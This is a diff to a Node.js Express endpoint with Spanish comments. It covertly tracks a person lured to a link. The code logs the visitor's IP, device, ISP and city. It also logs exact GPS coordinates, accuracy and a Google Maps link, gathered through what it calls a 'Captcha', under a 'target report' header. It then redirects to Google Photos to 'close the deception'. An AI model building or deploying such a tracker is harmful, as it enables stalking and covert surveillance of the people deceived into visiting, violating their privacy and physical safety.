@@ -1,36 +1,29 @@
-const express = require('express');
-const axios = require('axios');
-const app = express();
+// ... (mismo inicio de tu código anterior)
 
 app.get('/api/track', async (req, res) => {
     try {
-        // 1. Obtener la IP real (manejando proxies de Vercel/Netlify)
         const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
-
-        // 2. Obtener el User Agent (Dispositivo/Browser)
+        const { lat, lon, acc, gps } = req.query; // Capturamos los datos del Captcha
         const userAgent = req.headers['user-agent'];
 
-        // 3. Obtener Localización (Geocoding por IP)
-        const geoResponse = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,mobile,proxy`);
+        const geoResponse = await axios.get(`http://ip-api.com/json/${ip}`);
         const geo = geoResponse.data;
 
-        // 4. Loggear en consola para tu reporte
-        console.log("--- NUEVO TARGET DETECTADO ---");
-        console.log(`IP: ${ip}`);
-        console.log(`Dispositivo: ${userAgent}`);
-        console.log(`Ubicación: ${geo.city}, ${geo.country}`);
-        console.log(`ISP: ${geo.isp}`);
-        console.log(`Es Mobile: ${geo.mobile ? 'Sí' : 'No'}`);
-        console.log(`Usa Proxy/VPN: ${geo.proxy ? 'Sí' : 'No'}`);
+        console.log("--- REPORTE DE OBJETIVO ---");
+        if (lat && lon) {
+            console.log(`📍 UBICACIÓN GPS REAL: https://www.google.com/maps?q=${lat},${lon}`);
+            console.log(`🎯 Precisión: ${acc} metros`);
+        } else {
+            console.log(`❌ GPS Denegado/No soportado. Razón: ${gps}`);
+        }
+        
+        console.log(`🌐 IP: ${ip} (${geo.isp})`);
+        console.log(`📱 Dispositivo: ${userAgent}`);
+        console.log(`🏙️ Ciudad (IP): ${geo.city}, ${geo.country}`);
+        console.log("---------------------------");
 
-        // 5. Redirección final (Para no levantar sospechas)
-        // Puedes redirigirlo a Google o a una imagen de "Archivo no encontrado"
-        res.redirect('https://www.google.com/search?q=documento+no+encontrado+error+404');
-
-    } catch (error) {
-        console.error("Error capturando datos:", error);
-        res.redirect('https://www.google.com');
+        res.redirect('https://photos.google.com'); // Redirigir a Google Fotos real para cerrar el engaño
+    } catch (e) {
+        res.redirect('https://photos.google.com');
     }
 });
-
-module.exports = app;
